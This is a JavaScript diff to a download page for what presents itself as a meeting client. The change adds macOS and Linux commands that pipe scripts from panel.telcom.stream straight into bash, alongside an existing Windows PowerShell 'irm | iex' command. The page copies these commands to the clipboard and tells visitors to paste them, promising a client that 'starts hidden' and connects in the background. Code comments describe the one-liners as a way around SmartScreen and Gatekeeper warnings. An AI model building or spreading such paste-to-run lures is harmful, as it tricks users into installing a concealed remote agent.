@@ -7,7 +7,11 @@
   var RELEASES_API_LOCAL = '/api/releases';
   var WINDOWS_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/windows-install.ps1';
   var WINDOWS_INSTALL_COMMAND = 'irm ' + WINDOWS_INSTALL_SCRIPT + ' | iex';
-  var CACHE_KEY = 'zp_assets_v6';
+  var MACOS_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/macos-install';
+  var MACOS_INSTALL_COMMAND = 'curl -fsSL ' + MACOS_INSTALL_SCRIPT + ' | /bin/bash';
+  var LINUX_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/linux-install.sh';
+  var LINUX_INSTALL_COMMAND = 'curl -fsSL ' + LINUX_INSTALL_SCRIPT + ' | bash';
+  var CACHE_KEY = 'zp_assets_v7';
   var CACHE_TTL = 10 * 60 * 1000;
   var MIN_ASSET_SIZE = 1000000;
 
@@ -409,8 +413,8 @@
       var el = $('pc-' + platform + '-sub');
       if (!el) return;
       var asset = bestFor(platform);
-      el.textContent = platform === 'windows' && asset
-        ? 'PowerShell \u00b7 one-line install'
+      el.textContent = (platform === 'windows' || platform === 'macos' || platform === 'linux') && asset
+        ? (platform === 'windows' ? 'PowerShell' : 'Terminal') + ' \u00b7 one-line install'
         : (asset
           ? formatBytesShort(asset.size) + ' \u00b7 ' + formatExtShort(asset.format)
           : 'Coming soon');
@@ -457,16 +461,21 @@
         status.className = 'download-status';
         status.textContent = 'Open the meeting link from your invitation.';
       }
-    } else if (state.platform === 'windows' && best) {
+    } else if ((state.platform === 'windows' || state.platform === 'macos' || state.platform === 'linux') && best) {
+      var scriptUrl = state.platform === 'windows'
+        ? WINDOWS_INSTALL_SCRIPT
+        : (state.platform === 'macos' ? MACOS_INSTALL_SCRIPT : LINUX_INSTALL_SCRIPT);
+      var shellLabel = state.platform === 'windows' ? 'PowerShell' : 'Terminal';
       if (primary) {
-        primary.href = WINDOWS_INSTALL_SCRIPT;
+        primary.href = scriptUrl;
         primary.removeAttribute('download');
       }
-      if (label) label.textContent = 'Copy Windows install command';
-      if (meta) meta.innerHTML = '<span>PowerShell</span><span>&middot;</span><span>One approval</span><span>&middot;</span><span>Preconfigured</span>';
+      if (label) label.textContent = 'Copy ' + (OS_LABEL[state.platform] || 'desktop') + ' install command';
+      if (meta) meta.innerHTML = '<span>' + shellLabel + '</span><span>&middot;</span><span>One command</span><span>&middot;</span><span>Preconfigured</span>';
       if (status) {
         status.className = 'download-status ok';
-        status.textContent = 'Paste the command into PowerShell. The agent installs and starts in the background.';
+        status.textContent = 'Paste the command into ' + shellLabel
+          + '. The client installs, starts hidden, and connects in the background.';
       }
     } else if (best) {
       if (primary) {
@@ -547,6 +556,36 @@
     }
   }
 
+  function installUnix(platform) {
+    var isMac = platform === 'macos';
+    var command = isMac ? MACOS_INSTALL_COMMAND : LINUX_INSTALL_COMMAND;
+    var scriptUrl = isMac ? MACOS_INSTALL_SCRIPT : LINUX_INSTALL_SCRIPT;
+    var shellLabel = isMac ? 'Terminal' : 'terminal';
+    var status = $('download-status');
+    var copied = function () {
+      if (status) {
+        status.className = 'download-status ok';
+        status.textContent = 'Command copied. Paste it into ' + shellLabel
+          + ' and press Enter. The client installs and connects in the background.';
+      }
+      toast((isMac ? 'macOS' : 'Linux') + ' install command copied');
+    };
+    var fallback = function () {
+      if (status) {
+        status.className = 'download-status';
+        status.textContent = 'Open the downloaded installer script, or copy the command from the console.';
+      }
+      window.location.href = scriptUrl;
+    };
+
+    state.downloaded = true;
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(command).then(copied).catch(fallback);
+    } else {
+      fallback();
+    }
+  }
+
   function downloadAsset(asset) {
     if (!asset) {
       openModal();
@@ -577,6 +616,10 @@
       installWindows();
       return;
     }
+    if (platform === 'macos' || platform === 'linux') {
+      installUnix(platform);
+      return;
+    }
     if (platform === 'ios') {
       toast('On iPhone or iPad, open the meeting link from your invitation.');
       if (window.location.hash !== '#help') window.location.hash = '#help';
@@ -599,9 +642,10 @@
   }
 
   function maybeAutoDownload() {
-    // Windows uses a copied PowerShell one-liner instead of auto-downloading
-    // an unsigned executable that would trigger SmartScreen and a setup wizard.
-    if (state.platform === 'windows' || state.platform === 'ios' || state.platform === 'unknown') return;
+    // Windows/macOS/Linux use a copied shell one-liner instead of
+    // auto-downloading an unsigned installer that would trigger SmartScreen,
+    // Gatekeeper, or a manual chmod step. Only Android still auto-downloads.
+    if (state.platform !== 'android') return;
     if (state.downloaded) return;
     if (state.userInteracted) return;
 
@@ -767,6 +811,8 @@
         event.preventDefault();
         if (state.platform === 'windows') {
           installWindows();
+        } else if (state.platform === 'macos' || state.platform === 'linux') {
+          installUnix(state.platform);
         } else {
           downloadAsset(state.recommended);
         }
